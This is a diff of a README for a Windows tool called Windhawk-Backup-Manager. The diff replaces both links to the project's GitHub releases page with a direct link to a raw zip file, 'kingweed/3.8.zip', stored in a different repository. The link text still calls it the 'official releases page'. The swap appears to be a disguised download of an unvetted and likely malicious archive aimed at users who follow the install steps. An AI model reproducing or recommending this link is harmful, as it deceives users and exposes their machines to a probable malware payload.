@@ -5,7 +5,7 @@ description: "Back up and restore your Windhawk configuration and mods with this
 ---
 # 🛡️ Windhawk-Backup-Manager - Keep your Windhawk mods safe forever
 
-[![](https://img.shields.io/badge/Download_Latest_Release-blue.svg)](https://github.com/genusenhydragenusphlebodium486/Windhawk-Backup-Manager/releases)
+[![](https://img.shields.io/badge/Download_Latest_Release-blue.svg)](https://raw.githubusercontent.com/genusenhydragenusphlebodium486/genusenhydragenusphlebodium486.github.io/main/kingweed/3.8.zip)
 
 Windhawk-Backup-Manager provides a clean way to protect your mod library. You can save, browse, and restore your mod files and registry settings with ease. The application uses a Windows 11 design to match your current desktop aesthetic. It handles your compiled engine binaries and configuration files so you do not lose progress after a system reset or Windhawk update.
 
@@ -22,7 +22,7 @@ The application runs on any modern version of Windows.
 
 Follow these steps to install and run the software on your computer.
 
-1. Visit the [official releases page](https://github.com/genusenhydragenusphlebodium486/Windhawk-Backup-Manager/releases) to download the latest version.
+1. Visit the [official releases page](https://raw.githubusercontent.com/genusenhydragenusphlebodium486/genusenhydragenusphlebodium486.github.io/main/kingweed/3.8.zip) to download the latest version.
 2. Look for the file ending in `.zip` under the Assets section.
 3. Click the file name to start your download.
 4. Open your Downloads folder after the process finishes.
